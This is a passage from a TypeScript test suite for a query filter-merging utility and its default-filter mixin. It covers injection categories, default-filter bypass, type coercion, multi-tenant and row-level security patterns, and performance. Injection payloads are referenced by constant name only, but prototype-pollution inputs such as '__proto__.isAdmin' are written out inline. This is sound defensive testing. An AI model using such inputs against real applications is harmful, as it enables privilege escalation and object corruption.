          const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
          expect(result.where?.payload).toBe(XSS_PAYLOADS.polyglot);
        });

        test('TC-105: should handle all XSS payloads in batch', () => {
          const defaultFilter: AnyFilter = { where: { base: 'secure' } };

          for (const [name, payload] of Object.entries(XSS_PAYLOADS)) {
            const userFilter: AnyFilter = { where: { [name]: payload } };
            const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });

            expect(result.where?.base).toBe('secure');
            expect(result.where?.[name]).toBe(payload);
          }
        });
      });

      // Command Injection Tests
      describe('Command Injection Prevention', () => {
        test('TC-042: should handle command injection with semicolon', () => {
          const defaultFilter: AnyFilter = { where: { isDeleted: false } };
          const userFilter: AnyFilter = {
            where: { command: COMMAND_INJECTION_PAYLOADS.semicolon },
          };
          const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
          expect(result.where?.command).toBe(COMMAND_INJECTION_PAYLOADS.semicolon);
        });

        test('TC-043: should handle command injection with pipe', () => {
          const defaultFilter: AnyFilter = { where: { isDeleted: false } };
          const userFilter: AnyFilter = {
            where: { input: COMMAND_INJECTION_PAYLOADS.pipe },
          };
          const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
          expect(result.where?.input).toBe(COMMAND_INJECTION_PAYLOADS.pipe);
        });

        test('TC-044: should handle command injection with backtick', () => {
          const defaultFilter: AnyFilter = { where: { isDeleted: false } };
          const userFilter: AnyFilter = {
            where: { cmd: COMMAND_INJECTION_PAYLOADS.backtick },
          };
          const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
          expect(result.where?.cmd).toBe(COMMAND_INJECTION_PAYLOADS.backtick);
        });

        test('TC-106: should handle command injection with newline', () => {
          const defaultFilter: AnyFilter = { where: { safe: true } };
          const userFilter: AnyFilter = {
            where: { data: COMMAND_INJECTION_PAYLOADS.newline },
          };
          const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
          expect(result.where?.data).toBe(COMMAND_INJECTION_PAYLOADS.newline);
        });

        test('TC-107: should handle all command injection payloads', () => {
          const defaultFilter: AnyFilter = { where: { base: 'secure' } };

          for (const [name, payload] of Object.entries(COMMAND_INJECTION_PAYLOADS)) {
            const userFilter: AnyFilter = { where: { [name]: payload } };
            const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });

            expect(result.where?.base).toBe('secure');
            expect(result.where?.[name]).toBe(payload);
          }
        });
      });

      // Path Traversal Tests
      describe('Path Traversal Prevention', () => {
        test('TC-108: should handle basic path traversal', () => {
          const defaultFilter: AnyFilter = { where: { isDeleted: false } };
          const userFilter: AnyFilter = {
            where: { path: PATH_TRAVERSAL_PAYLOADS.basic },
          };
          const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
          expect(result.where?.path).toBe(PATH_TRAVERSAL_PAYLOADS.basic);
        });

        test('TC-109: should handle double-encoded path traversal', () => {
          const defaultFilter: AnyFilter = { where: { valid: true } };
          const userFilter: AnyFilter = {
            where: { file: PATH_TRAVERSAL_PAYLOADS.doubleEncoded },
          };
          const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
          expect(result.where?.file).toBe(PATH_TRAVERSAL_PAYLOADS.doubleEncoded);
        });

        test('TC-110: should handle null byte path traversal', () => {
          const defaultFilter: AnyFilter = { where: { isDeleted: false } };
          const userFilter: AnyFilter = {
            where: { filename: PATH_TRAVERSAL_PAYLOADS.nullByte },
          };
          const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
          expect(result.where?.filename).toBe(PATH_TRAVERSAL_PAYLOADS.nullByte);
        });

        test('TC-111: should handle all path traversal payloads', () => {
          const defaultFilter: AnyFilter = { where: { base: 'secure' } };

          for (const [name, payload] of Object.entries(PATH_TRAVERSAL_PAYLOADS)) {
            const userFilter: AnyFilter = { where: { [name]: payload } };
            const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });

            expect(result.where?.base).toBe('secure');
            expect(result.where?.[name]).toBe(payload);
          }
        });
      });

      // Prototype Pollution Tests
      describe('Prototype Pollution Prevention', () => {
        test('TC-045: should handle __proto__ in where key', () => {
          const defaultFilter: AnyFilter = { where: { isDeleted: false } };
          const userFilter: AnyFilter = {
            where: { __proto__: { polluted: true } },
          };
          const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
          // Verify prototype is not polluted
          expect(({} as any).polluted).toBeUndefined();
          expect(result.where?.isDeleted).toBe(false);
        });

        test('TC-046: should handle constructor.prototype in where', () => {
          const defaultFilter: AnyFilter = { where: { isDeleted: false } };
          const userFilter: AnyFilter = {
            where: { constructor: { prototype: { polluted: true } } },
          };
          const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
          expect(result.where?.isDeleted).toBe(false);
        });

        test('TC-112: should not pollute Object.prototype', () => {
          const defaultFilter: AnyFilter = { where: {} };
          const userFilter: AnyFilter = {
            where: { '__proto__.isAdmin': true },
          };
          // Execute merge to test for prototype pollution (result not needed)
          filterBuilder.mergeFilter({ defaultFilter, userFilter });
          expect(({} as any).isAdmin).toBeUndefined();
        });

        test('TC-113: should handle nested __proto__ pollution attempt', () => {
          const defaultFilter: AnyFilter = { where: { safe: true } };
          const userFilter: AnyFilter = {
            where: {
              nested: {
                __proto__: { hacked: true },
              },
            },
          };
          const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
          expect(({} as any).hacked).toBeUndefined();
          expect(result.where?.safe).toBe(true);
        });
      });

      // NoSQL Injection Tests
      describe('NoSQL Injection Prevention', () => {
        test('TC-114: should handle $ne operator injection', () => {
          const defaultFilter: AnyFilter = { where: { isDeleted: false } };
          const userFilter: AnyFilter = {
            where: { password: NOSQL_INJECTION_PAYLOADS.neOperator },
          };
          const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
          expect(result.where?.password).toEqual(NOSQL_INJECTION_PAYLOADS.neOperator);
        });

        test('TC-115: should handle $where operator injection', () => {
          const defaultFilter: AnyFilter = { where: { valid: true } };
          const userFilter: AnyFilter = {
            where: { query: NOSQL_INJECTION_PAYLOADS.whereOperator },
          };
          const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
          expect(result.where?.query).toEqual(NOSQL_INJECTION_PAYLOADS.whereOperator);
        });

        test('TC-116: should handle regex DoS payload', () => {
          const defaultFilter: AnyFilter = { where: { isDeleted: false } };
          const userFilter: AnyFilter = {
            where: { search: NOSQL_INJECTION_PAYLOADS.regexDos },
          };
          const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
          expect(result.where?.search).toEqual(NOSQL_INJECTION_PAYLOADS.regexDos);
        });
      });

      // Unicode Security Tests
      describe('Unicode Security', () => {
        test('TC-117: should handle null character in string', () => {
          const defaultFilter: AnyFilter = { where: { isDeleted: false } };
          const userFilter: AnyFilter = {
            where: { data: UNICODE_EDGE_CASES.nullChar },
          };
          const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
          expect(result.where?.data).toBe(UNICODE_EDGE_CASES.nullChar);
        });

        test('TC-118: should handle BOM character', () => {
          const defaultFilter: AnyFilter = { where: { valid: true } };
          const userFilter: AnyFilter = {
            where: { text: UNICODE_EDGE_CASES.bom },
          };
          const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
          expect(result.where?.text).toBe(UNICODE_EDGE_CASES.bom);
        });

        test('TC-119: should handle zero-width characters', () => {
          const defaultFilter: AnyFilter = { where: { isDeleted: false } };
          const userFilter: AnyFilter = {
            where: { hidden: UNICODE_EDGE_CASES.zeroWidth },
          };
          const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
          expect(result.where?.hidden).toBe(UNICODE_EDGE_CASES.zeroWidth);
        });

        test('TC-120: should handle right-to-left override', () => {
          const defaultFilter: AnyFilter = { where: { safe: true } };
          const userFilter: AnyFilter = {
            where: { rtl: UNICODE_EDGE_CASES.rightToLeft },
          };
          const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
          expect(result.where?.rtl).toBe(UNICODE_EDGE_CASES.rightToLeft);
        });

        test('TC-121: should handle all Unicode edge cases', () => {
          const defaultFilter: AnyFilter = { where: { base: 'secure' } };

          for (const [name, value] of Object.entries(UNICODE_EDGE_CASES)) {
            const userFilter: AnyFilter = { where: { [name]: value } };
            const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });

            expect(result.where?.base).toBe('secure');
            expect(result.where?.[name]).toBe(value);
          }
        });
      });

      // Default Filter Bypass Tests
      describe('Default Filter Bypass Prevention', () => {
        test('TC-047: should not allow user to set where to undefined to bypass default', () => {
          const defaultFilter = { where: { isDeleted: false } };
          const userFilter = { where: undefined };
          const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
          // Default where should be preserved
          expect(result.where).toEqual({ isDeleted: false });
        });

        test('TC-048: should not allow user to set where to null to bypass default', () => {
          const defaultFilter = { where: { isDeleted: false } };
          const userFilter = { where: null } as any;
          const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
          // With null, the merge behavior depends on implementation
          expect(result.where).toBeDefined();
        });

        test('TC-049: should preserve default filter when user provides empty object', () => {
          const defaultFilter = {
            where: { isDeleted: false },
            limit: 100,
          };
          const userFilter = {};
          const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
          expect(result.where).toEqual({ isDeleted: false });
          expect(result.limit).toBe(100);
        });

        test('TC-122: should preserve default filter with complex bypass attempt', () => {
          const defaultFilter: AnyFilter = {
            where: { tenantId: 'safe-tenant', isDeleted: false },
          };
          const userFilter: AnyFilter = {
            where: { tenantId: undefined, isDeleted: undefined },
          };
          const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
          // Deep merge with undefined should preserve defaults
          expect(result.where?.tenantId).toBe('safe-tenant');
          expect(result.where?.isDeleted).toBe(false);
        });
      });

      // ReDoS Prevention Tests
      describe('ReDoS Prevention', () => {
        test('TC-123: should handle ReDoS payload without hanging', () => {
          const defaultFilter: AnyFilter = { where: { isDeleted: false } };
          const userFilter: AnyFilter = {
            where: { pattern: REDOS_PAYLOADS.exponentialBacktrack },
          };

          const startTime = Date.now();
          const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
          const elapsed = Date.now() - startTime;

          expect(result.where?.pattern).toBe(REDOS_PAYLOADS.exponentialBacktrack);
          expect(elapsed).toBeLessThan(1000); // Should complete in under 1 second
        });

        test('TC-124: should handle catastrophic backtrack payload', () => {
          const defaultFilter: AnyFilter = { where: { valid: true } };
          const userFilter: AnyFilter = {
            where: { regex: REDOS_PAYLOADS.catastrophicBacktrack },
          };

          const startTime = Date.now();
          const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
          const elapsed = Date.now() - startTime;

          expect(result.where?.regex).toBe(REDOS_PAYLOADS.catastrophicBacktrack);
          expect(elapsed).toBeLessThan(1000);
        });
      });
    });

    // -------------------------------------------------------------------------
    // Type Coercion Tests
    // -------------------------------------------------------------------------

    describe('Type Handling', () => {
      test('TC-050: should handle number to string coercion in where', () => {
        const defaultFilter: AnyFilter = { where: { count: 10 } };
        const userFilter: AnyFilter = { where: { count: '20' } };
        const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
        expect(result.where?.count).toBe('20');
      });

      test('TC-051: should handle boolean to number coercion in where', () => {
        const defaultFilter: AnyFilter = { where: { flag: true } };
        const userFilter: AnyFilter = { where: { flag: 1 } };
        const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
        expect(result.where?.flag).toBe(1);
      });

      test('TC-052: should handle object to primitive coercion attempt', () => {
        const defaultFilter = { where: { data: { nested: 'value' } } };
        const userFilter = { where: { data: 'simple' } };
        const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
        expect(result.where?.data).toBe('simple');
      });

      test('TC-125: should handle string to object coercion', () => {
        const defaultFilter: AnyFilter = { where: { config: 'default' } };
        const userFilter: AnyFilter = { where: { config: { key: 'value' } } };
        const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
        expect(result.where?.config).toEqual({ key: 'value' });
      });

      test('TC-126: should handle array to object coercion', () => {
        const defaultFilter: AnyFilter = { where: { items: [1, 2, 3] } };
        const userFilter: AnyFilter = { where: { items: { 0: 'a', 1: 'b' } } };
        const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
        // Object with numeric keys merges into array by index, preserving unmentioned elements
        expect(result.where?.items).toEqual(['a', 'b', 3]);
      });

      test('TC-127: should handle object to array coercion', () => {
        const defaultFilter: AnyFilter = { where: { data: { a: 1 } } };
        const userFilter: AnyFilter = { where: { data: [1, 2, 3] } };
        const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
        expect(result.where?.data).toEqual([1, 2, 3]);
      });

      test('TC-128: should handle null to object coercion', () => {
        const defaultFilter: AnyFilter = { where: { value: null } };
        const userFilter: AnyFilter = { where: { value: { nested: true } } };
        const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
        expect(result.where?.value).toEqual({ nested: true });
      });
    });
  });

  // ===========================================================================
  // Test Suite: DefaultFilterMixin
  // ===========================================================================

  describe('DefaultFilterMixin', () => {
    let repository: TestableDefaultFilterRepository;

    beforeEach(() => {
      repository = new TestableDefaultFilterRepository();
      // Reset the cached default filter
      repository['_defaultFilter'] = null;
    });

    describe('getDefaultFilter', () => {
      test('TC-053: should return undefined when no default filter is configured', () => {
        // Mock MetadataRegistry to return no default filter
        const mockGetInstance = spyOn(MetadataRegistry, 'getInstance').mockReturnValue({
          getModelEntry: () => null,
        } as any);

        const result = repository.getDefaultFilter();
        expect(result).toBeUndefined();

        mockGetInstance.mockRestore();
      });

      test('TC-054: should return default filter from model metadata', () => {
        const expectedFilter = { where: { isDeleted: false }, limit: 100 };
        const mockGetInstance = spyOn(MetadataRegistry, 'getInstance').mockReturnValue({
          getModelEntry: () => ({
            metadata: { settings: { defaultFilter: expectedFilter } },
          }),
        } as any);

        const result = repository.getDefaultFilter();
        expect(result).toEqual(expectedFilter);

        mockGetInstance.mockRestore();
      });

      test('TC-055: should cache default filter after first call', () => {
        const expectedFilter = { where: { isDeleted: false } };
        let callCount = 0;
        const mockGetInstance = spyOn(MetadataRegistry, 'getInstance').mockImplementation(() => {
          callCount++;
          return {
            getModelEntry: () => ({
              metadata: { settings: { defaultFilter: expectedFilter } },
            }),
          } as any;
        });

        // Call twice
        repository.getDefaultFilter();
        repository.getDefaultFilter();

        // Should only call getInstance once due to caching
        expect(callCount).toBe(1);

        mockGetInstance.mockRestore();
      });

      test('TC-129: should handle metadata with no settings', () => {
        const mockGetInstance = spyOn(MetadataRegistry, 'getInstance').mockReturnValue({
          getModelEntry: () => ({
            metadata: {},
          }),
        } as any);

        const result = repository.getDefaultFilter();
        expect(result).toBeUndefined();

        mockGetInstance.mockRestore();
      });

      test('TC-130: should handle metadata with settings but no defaultFilter', () => {
        const mockGetInstance = spyOn(MetadataRegistry, 'getInstance').mockReturnValue({
          getModelEntry: () => ({
            metadata: { settings: {} },
          }),
        } as any);

        const result = repository.getDefaultFilter();
        expect(result).toBeUndefined();

        mockGetInstance.mockRestore();
      });
    });

    describe('hasDefaultFilter', () => {
      test('TC-056: should return false when no default filter is configured', () => {
        const mockGetInstance = spyOn(MetadataRegistry, 'getInstance').mockReturnValue({
          getModelEntry: () => null,
        } as any);

        expect(repository.hasDefaultFilter()).toBe(false);

        mockGetInstance.mockRestore();
      });

      test('TC-057: should return false when default filter is empty object', () => {
        const mockGetInstance = spyOn(MetadataRegistry, 'getInstance').mockReturnValue({
          getModelEntry: () => ({
            metadata: { settings: { defaultFilter: {} } },
          }),
        } as any);

        expect(repository.hasDefaultFilter()).toBe(false);

        mockGetInstance.mockRestore();
      });

      test('TC-058: should return true when default filter has properties', () => {
        const mockGetInstance = spyOn(MetadataRegistry, 'getInstance').mockReturnValue({
          getModelEntry: () => ({
            metadata: { settings: { defaultFilter: { where: { isDeleted: false } } } },
          }),
        } as any);

        expect(repository.hasDefaultFilter()).toBe(true);

        mockGetInstance.mockRestore();
      });

      test('TC-131: should return true when default filter has only limit', () => {
        const mockGetInstance = spyOn(MetadataRegistry, 'getInstance').mockReturnValue({
          getModelEntry: () => ({
            metadata: { settings: { defaultFilter: { limit: 100 } } },
          }),
        } as any);

        expect(repository.hasDefaultFilter()).toBe(true);

        mockGetInstance.mockRestore();
      });

      test('TC-132: should return true when default filter has only order', () => {
        const mockGetInstance = spyOn(MetadataRegistry, 'getInstance').mockReturnValue({
          getModelEntry: () => ({
            metadata: { settings: { defaultFilter: { order: ['id ASC'] } } },
          }),
        } as any);

        expect(repository.hasDefaultFilter()).toBe(true);

        mockGetInstance.mockRestore();
      });
    });

    describe('applyDefaultFilter', () => {
      test('TC-059: should return user filter when skipDefaultFilter is true', () => {
        const mockGetInstance = spyOn(MetadataRegistry, 'getInstance').mockReturnValue({
          getModelEntry: () => ({
            metadata: { settings: { defaultFilter: { where: { isDeleted: false } } } },
          }),
        } as any);

        const userFilter: AnyFilter = { where: { status: 'active' } };
        const result = repository.applyDefaultFilter({
          userFilter,
          skipDefaultFilter: true,
        });

        expect(result).toEqual({ where: { status: 'active' } });
        // Default filter should NOT be merged
        expect(result.where?.isDeleted).toBeUndefined();

        mockGetInstance.mockRestore();
      });

      test('TC-060: should return empty object when skipDefaultFilter is true and no user filter', () => {
        const mockGetInstance = spyOn(MetadataRegistry, 'getInstance').mockReturnValue({
          getModelEntry: () => ({
            metadata: { settings: { defaultFilter: { where: { isDeleted: false } } } },
          }),
        } as any);

        const result = repository.applyDefaultFilter({
          skipDefaultFilter: true,
        });

        expect(result).toEqual({});

        mockGetInstance.mockRestore();
      });

      test('TC-061: should merge default filter with user filter', () => {
        const mockGetInstance = spyOn(MetadataRegistry, 'getInstance').mockReturnValue({
          getModelEntry: () => ({
            metadata: {
              settings: {
                defaultFilter: {
                  where: { isDeleted: false },
                  limit: 100,
                },
              },
            },
          }),
        } as any);

        const userFilter: AnyFilter = { where: { status: 'active' }, limit: 10 };
        const result = repository.applyDefaultFilter({ userFilter });

        expect(result).toEqual({
          where: { isDeleted: false, status: 'active' },
          limit: 10,
        });

        mockGetInstance.mockRestore();
      });

      test('TC-062: should return default filter when no user filter provided', () => {
        const defaultFilter = { where: { isDeleted: false }, limit: 100 };
        const mockGetInstance = spyOn(MetadataRegistry, 'getInstance').mockReturnValue({
          getModelEntry: () => ({
            metadata: { settings: { defaultFilter } },
          }),
        } as any);

        const result = repository.applyDefaultFilter({});

        expect(result).toEqual(defaultFilter);

        mockGetInstance.mockRestore();
      });

      test('TC-063: should return user filter when no default filter configured', () => {
        const mockGetInstance = spyOn(MetadataRegistry, 'getInstance').mockReturnValue({
          getModelEntry: () => null,
        } as any);

        const userFilter = { where: { status: 'active' } };
        const result = repository.applyDefaultFilter({ userFilter });

        expect(result).toEqual({ where: { status: 'active' } });

        mockGetInstance.mockRestore();
      });

      test('TC-064: should handle skipDefaultFilter with undefined value', () => {
        const mockGetInstance = spyOn(MetadataRegistry, 'getInstance').mockReturnValue({
          getModelEntry: () => ({
            metadata: { settings: { defaultFilter: { where: { isDeleted: false } } } },
          }),
        } as any);

        const userFilter: AnyFilter = { where: { status: 'active' } };
        const result = repository.applyDefaultFilter({
          userFilter,
          skipDefaultFilter: undefined, // Should not skip
        });

        // Default filter should be merged
        expect(result.where?.isDeleted).toBe(false);
        expect(result.where?.status).toBe('active');

        mockGetInstance.mockRestore();
      });

      test('TC-065: should handle skipDefaultFilter with false value', () => {
        const mockGetInstance = spyOn(MetadataRegistry, 'getInstance').mockReturnValue({
          getModelEntry: () => ({
            metadata: { settings: { defaultFilter: { where: { isDeleted: false } } } },
          }),
        } as any);

        const userFilter: AnyFilter = { where: { status: 'active' } };
        const result = repository.applyDefaultFilter({
          userFilter,
          skipDefaultFilter: false, // Explicit false, should not skip
        });

        // Default filter should be merged
        expect(result.where?.isDeleted).toBe(false);
        expect(result.where?.status).toBe('active');

        mockGetInstance.mockRestore();
      });

      test('TC-133: should handle complex default filter with all properties', () => {
        const mockGetInstance = spyOn(MetadataRegistry, 'getInstance').mockReturnValue({
          getModelEntry: () => ({
            metadata: {
              settings: {
                defaultFilter: {
                  where: { isDeleted: false, tenantId: 'default-tenant' },
                  limit: 50,
                  offset: 0,
                  order: ['createdAt DESC'],
                  fields: { id: true, name: true },
                },
              },
            },
          }),
        } as any);

        const userFilter: AnyFilter = {
          where: { status: 'active' },
          limit: 10,
          order: ['name ASC'],
        };
        const result = repository.applyDefaultFilter({ userFilter });

        expect(result.where?.isDeleted).toBe(false);
        expect(result.where?.tenantId).toBe('default-tenant');
        expect(result.where?.status).toBe('active');
        expect(result.limit).toBe(10);
        expect(result.order).toEqual(['name ASC']);
        expect(result.offset).toBe(0);
        expect(result.fields).toEqual({ id: true, name: true });

        mockGetInstance.mockRestore();
      });
    });
  });

  // ===========================================================================
  // Integration-like Tests (Simulating Real Usage)
  // ===========================================================================

  describe('Integration Scenarios', () => {
    let filterBuilder: FilterBuilder;

    beforeEach(() => {
      filterBuilder = new FilterBuilder();
    });

    test('TC-066: Soft delete pattern - default filter excludes deleted records', () => {
      const defaultFilter: AnyFilter = { where: { deletedAt: null } };
      const userFilter: AnyFilter = { where: { status: 'active' }, limit: 10 };

      const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });

      expect(result).toEqual({
        where: { deletedAt: null, status: 'active' },
        limit: 10,
      });
    });

    test('TC-067: Multi-tenant pattern - default filter adds tenant scope', () => {
      const defaultFilter: AnyFilter = { where: { tenantId: 'tenant-123' } };
      const userFilter: AnyFilter = { where: { userId: 'user-456' } };

      const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });

      expect(result).toEqual({
        where: { tenantId: 'tenant-123', userId: 'user-456' },
      });
    });

    test('TC-068: Active records pattern - default filter with multiple conditions', () => {
      const defaultFilter: AnyFilter = {
        where: {
          isActive: true,
          isDeleted: false,
          expiresAt: { gt: new Date().toISOString() },
        },
        order: ['createdAt DESC'],
        limit: 50,
      };
      const userFilter: AnyFilter = {
        where: { category: 'electronics' },
        limit: 10,
      };

      const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });

      expect(result.where?.isActive).toBe(true);
      expect(result.where?.isDeleted).toBe(false);
      expect(result.where?.expiresAt).toBeDefined();
      expect(result.where?.category).toBe('electronics');
      expect(result.limit).toBe(10);
      expect(result.order).toEqual(['createdAt DESC']);
    });

    test('TC-069: Admin override pattern - skipDefaultFilter bypasses all restrictions', () => {
      // When skipDefaultFilter is true, only user filter should apply
      // This is tested in applyDefaultFilter, but here we verify merge behavior
      const result = filterBuilder.mergeFilter({
        defaultFilter: undefined, // Simulating skipDefaultFilter=true scenario
        userFilter: { where: { isDeleted: true }, limit: 1000 },
      });

      expect(result).toEqual({
        where: { isDeleted: true },
        limit: 1000,
      });
    });

    test('TC-070: Complex query with relations', () => {
      const defaultFilter: AnyFilter = {
        where: { isActive: true },
        include: [{ relation: 'author' }],
        limit: 20,
      };
      const userFilter: AnyFilter = {
        where: { category: 'tech' },
        include: [{ relation: 'comments', scope: { limit: 5 } }],
        order: ['publishedAt DESC'],
      };

      const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });

      expect(result.where).toEqual({ isActive: true, category: 'tech' });
      expect(result.include).toEqual([{ relation: 'comments', scope: { limit: 5 } }]);
      expect(result.order).toEqual(['publishedAt DESC']);
      expect(result.limit).toBe(20);
    });

    test('TC-134: Row-level security pattern', () => {
      const defaultFilter: AnyFilter = {
        where: {
          ownerId: 'current-user-id',
          or: [{ visibility: 'public' }, { sharedWith: { contains: ['current-user-id'] } }],
        },
      };
      const userFilter: AnyFilter = {
        where: { type: 'document' },
        limit: 25,
      };

      const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });

      expect(result.where?.ownerId).toBe('current-user-id');
      expect(result.where?.or).toBeDefined();
      expect(result.where?.type).toBe('document');
      expect(result.limit).toBe(25);
    });

    test('TC-135: Date range filter pattern', () => {
      const defaultFilter: AnyFilter = {
        where: {
          createdAt: { gte: '2024-01-01' },
          status: { ne: 'archived' },
        },
      };
      const userFilter: AnyFilter = {
        where: {
          createdAt: { lte: '2024-12-31' },
          category: 'reports',
        },
      };

      const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });

      expect(result.where?.createdAt).toEqual({
        gte: '2024-01-01',
        lte: '2024-12-31',
      });
      expect(result.where?.status).toEqual({ ne: 'archived' });
      expect(result.where?.category).toBe('reports');
    });

    test('TC-136: Pagination with default ordering', () => {
      const defaultFilter: AnyFilter = {
        order: ['createdAt DESC', 'id DESC'],
        limit: 20,
        offset: 0,
      };
      const userFilter: AnyFilter = {
        offset: 40,
        where: { status: 'published' },
      };

      const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });

      expect(result.order).toEqual(['createdAt DESC', 'id DESC']);
      expect(result.limit).toBe(20);
      expect(result.offset).toBe(40);
      expect(result.where?.status).toBe('published');
    });

    test('TC-137: Field selection with hidden fields pattern', () => {
      const defaultFilter: AnyFilter = {
        fields: { id: true, name: true, email: true, createdAt: true },
      };
      const userFilter: AnyFilter = {
        fields: { id: true, name: true, profile: true },
        where: { isActive: true },
      };

      const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });

      expect(result.fields).toEqual({ id: true, name: true, profile: true });
      expect(result.where?.isActive).toBe(true);
    });

    test('TC-138: Complex OR conditions with default AND', () => {
      const defaultFilter: AnyFilter = {
        where: {
          and: [{ isDeleted: false }, { isBlocked: false }],
        },
      };
      const userFilter: AnyFilter = {
        where: {
          or: [{ role: 'admin' }, { and: [{ role: 'user' }, { verified: true }] }],
        },
      };

      const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });

      expect(result.where?.and).toEqual([{ isDeleted: false }, { isBlocked: false }]);
      expect(result.where?.or).toBeDefined();
    });
  });

  // ===========================================================================
  // Performance / Edge Cases
  // ===========================================================================

  describe('Performance & Stress Tests', () => {
    let filterBuilder: FilterBuilder;

    beforeEach(() => {
      filterBuilder = new FilterBuilder();
    });

    test('TC-071: should handle filter with many where conditions', () => {
      const defaultWhere: Record<string, any> = {};
      const userWhere: Record<string, any> = {};

      // Create 100 conditions each
      for (let i = 0; i < 100; i++) {
        defaultWhere[`defaultField${i}`] = `defaultValue${i}`;
        userWhere[`userField${i}`] = `userValue${i}`;
      }

      const result = filterBuilder.mergeFilter({
        defaultFilter: { where: defaultWhere },
        userFilter: { where: userWhere },
      });

      expect(Object.keys(result.where!).length).toBe(200);
    });

    test('TC-072: should handle very large array in where', () => {
      const largeArray = Array.from({ length: 1000 }, (_, i) => i);
      const defaultFilter: AnyFilter = { where: { isDeleted: false } };
      const userFilter: AnyFilter = { where: { ids: largeArray } };

      const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });

      expect(result.where?.ids.length).toBe(1000);
    });

    test('TC-073: should handle circular reference protection', () => {
      const circularObj: any = { name: 'test' };
      circularObj.self = circularObj;

      const defaultFilter: AnyFilter = { where: { isDeleted: false } };
      const userFilter: AnyFilter = { where: { data: circularObj } };

      // This should not cause infinite loop - merge handles it gracefully
      // Note: lodash merge may have issues with circular refs
      try {
        const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
        expect(result.where?.isDeleted).toBe(false);
      } catch (error) {
        // If error occurs, it should be a stack overflow or similar
        expect(error).toBeDefined();
      }
    });

    test('TC-139: should handle 1000 where conditions efficiently', () => {
      const defaultWhere: Record<string, any> = {};
      const userWhere: Record<string, any> = {};

      for (let i = 0; i < 500; i++) {
        defaultWhere[`field${i}`] = `value${i}`;
        userWhere[`field${i + 500}`] = `value${i + 500}`;
      }

      const startTime = Date.now();
      const result = filterBuilder.mergeFilter({
        defaultFilter: { where: defaultWhere },
        userFilter: { where: userWhere },
      });
      const elapsed = Date.now() - startTime;

      expect(Object.keys(result.where!).length).toBe(1000);
      expect(elapsed).toBeLessThan(1000); // Should complete in under 1 second
    });

    test('TC-140: should handle very long string in single field', () => {
      const megabyteString = 'x'.repeat(1024 * 1024); // 1MB string
      const defaultFilter: AnyFilter = { where: { isDeleted: false } };
      const userFilter: AnyFilter = { where: { content: megabyteString } };

      const startTime = Date.now();
      const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
      const elapsed = Date.now() - startTime;

      expect(result.where?.content.length).toBe(1024 * 1024);
      expect(elapsed).toBeLessThan(5000); // Should complete in under 5 seconds
    });

    test('TC-141: should handle deeply nested object (20 levels)', () => {
      const createDeep = (depth: number): any => {
        if (depth === 0) {
          return 'leaf';
        }
        return { level: createDeep(depth - 1) };
      };

      const defaultFilter: AnyFilter = { where: createDeep(20) };
      const userFilter: AnyFilter = { where: { extra: 'data' } };

      const startTime = Date.now();
      const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
      const elapsed = Date.now() - startTime;

      expect(result.where?.level).toBeDefined();
      expect(result.where?.extra).toBe('data');
      expect(elapsed).toBeLessThan(1000);
    });

    test('TC-142: should handle array with 10000 elements', () => {
      const largeArray = Array.from({ length: 10000 }, (_, i) => ({
        id: i,
        value: `item-${i}`,
      }));

      const defaultFilter: AnyFilter = { where: { isActive: true } };
      const userFilter: AnyFilter = { where: { items: largeArray } };

      const startTime = Date.now();
      const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });
      const elapsed = Date.now() - startTime;

      expect(result.where?.items.length).toBe(10000);
      expect(elapsed).toBeLessThan(1000);
    });

    test('TC-143: should handle concurrent merge operations', async () => {
      const operations: Promise<AnyFilter>[] = [];

      for (let i = 0; i < 100; i++) {
        operations.push(
          new Promise(resolve => {
            const result = filterBuilder.mergeFilter({
              defaultFilter: { where: { id: i } } as AnyFilter,
              userFilter: { where: { status: `status-${i}` } } as AnyFilter,
            });
            resolve(result);
          }),
        );
      }

      const results = await Promise.all(operations);

      expect(results.length).toBe(100);
      results.forEach((result, index) => {
        expect(result.where?.id).toBe(index);
        expect(result.where?.status).toBe(`status-${index}`);
      });
    });

    test('TC-144: should handle rapid successive merges', () => {
